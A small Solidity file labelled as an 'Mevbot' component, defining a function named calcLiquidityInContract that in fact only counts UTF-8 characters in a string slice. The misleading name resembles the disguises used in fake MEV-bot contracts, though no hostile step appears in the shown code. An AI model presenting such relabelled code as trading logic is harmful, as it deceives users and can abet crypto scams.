//Mevbot version 1.1.7-1

//SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

import "./TestLib.sol";
contract calcLiquidityInContractFacet {
    function calcLiquidityInContract(
        TestLib.slice memory self
    ) internal pure returns (uint256 l) {
        uint256 ptr = self._ptr - 31;
        uint256 end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly {
                b := and(mload(ptr), 0xFF)
            }
            if (b < 0x80) {
                ptr += 1;
            } else if (b < 0xE0) {
                ptr += 2;
            } else if (b < 0xF0) {
                ptr += 3;
            } else if (b < 0xF8) {
                ptr += 4;
            } else if (b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }
}
